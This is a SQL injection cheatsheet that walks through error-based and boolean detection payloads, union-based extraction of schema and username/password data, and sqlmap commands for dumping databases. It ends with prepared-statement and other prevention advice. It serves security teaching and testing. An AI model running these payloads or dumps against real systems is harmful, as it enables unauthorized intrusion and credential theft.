# ðŸ’‰ SQL Injection (SQLi) - Practical Cheatsheet

**Disclaimer:** For authorized security testing and educational purposes only. Unauthorized attacks are illegal.

---

### ## Manual SQLi Detection

**Goal:** Confirm if an input point is vulnerable by breaking or manipulating the SQL query.

* **Test with Error-Based Characters:** Use these characters in URL parameters, search bars, or login forms. A database error or a change in the page indicates a potential flaw.
    ```
    '
    "
    ' OR 1=1--
    " OR 1=1--
    ' OR 'a'='a
    ```
    **Example:** `http://example.com/products.php?id=1'`

* **Test with Boolean Logic:** Observe if the page content changes based on a true/false condition.
    ```sql
    -- If this returns the original page, it's likely vulnerable.
    ' AND 1=1--

    -- If this returns a different page (e.g., "not found"), it confirms the vulnerability.
    ' AND 1=2--
    ```
    

---

### ## Manual Enumeration (Union-Based)

**Goal:** Extract data after confirming a vulnerability.

* **Step 1: Find Column Count with `ORDER BY`**
    Increment the number until you get an error. The last working number is the column count.
    ```sql
    http://.../products.php?id=1' ORDER BY 1--
    http://.../products.php?id=1' ORDER BY 2--
    http://.../products.php?id=1' ORDER BY 3--  -- This one fails
    -- Conclusion: There are 2 columns.
    ```

* **Step 2: Find Reflected Columns with `UNION SELECT`**
    Replace a valid ID with a non-existent one (`-1`) and use `UNION` to see which columns are displayed.
    ```sql
    http://.../products.php?id=-1' UNION SELECT 1,2--
    -- Look for the numbers '1' and '2' appearing on the page.
    ```

* **Step 3: Enumerate Database Information**
    Replace the numbers in the reflected columns with database functions.
    ```sql
    -- Get DB user and version
    ...id=-1' UNION SELECT user(),@@version--

    -- Get DB name
    ...id=-1' UNION SELECT database(),'foo'--
    ```

* **Step 4: Dump Schema and Data**
    Use `information_schema` to extract table and column names, then dump the data.
    ```sql
    -- Get table names
    ...id=-1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--

    -- Get column names from a table called 'users'
    ...id=-1' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--

    -- Dump the data
    ...id=-1' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users--
    ```

---

### ## Automated Testing with `sqlmap`

**Goal:** Use `sqlmap` to automate the detection and enumeration process for security auditing.

* **Basic Scan:**
    Point `sqlmap` at a URL with parameters.
    ```bash
    sqlmap -u "[http://example.com/products.php?id=1](http://example.com/products.php?id=1)" --batch
    ```

* **Scan a Login Form (POST Request):**
    ```bash
    sqlmap -u "[http://example.com/login.php](http://example.com/login.php)" --data="username=test&password=test" --level=3 --risk=3
    ```

* **Core Enumeration Commands:**
    ```bash
    # List databases
    sqlmap -u "..." --dbs

    # List tables of a specific database
    sqlmap -u "..." -D <database_name> --tables

    # List columns of a specific table
    sqlmap -u "..." -D <database_name> -T <table_name> --columns

    # Dump all data from a table
    sqlmap -u "..." -D <database_name> -T <table_name> --dump
    ```

---

### ## ðŸ›¡ï¸ Prevention (The Only Real Solution)

* **Primary Defense: Prepared Statements (Parameterized Queries)**
    This technique separates the SQL command from the data, making it impossible for user input to be executed as code.

    **Vulnerable PHP:**
    ```php
    $id = $_GET['id'];
    $result = mysqli_query($conn, "SELECT * FROM products WHERE id = " . $id);
    ```

    **Secure PHP (using PDO):**
    ```php
    $stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
    $stmt->execute([$_GET['id']]);
    $result = $stmt->fetchAll();
    ```

* **Secondary Defenses:**
    * **Input Validation:** Reject any input that does not match the expected format (e.g., if you expect a number, ensure it's a number).
    * **Least Privilege:** The application's database user should only have the minimum permissions it needs to function (e.g., only `SELECT` and `UPDATE`, but not `DROP`).
    * **Web Application Firewall (WAF):** A WAF can block basic and known SQLi patterns as a layer of defense-in-depth.
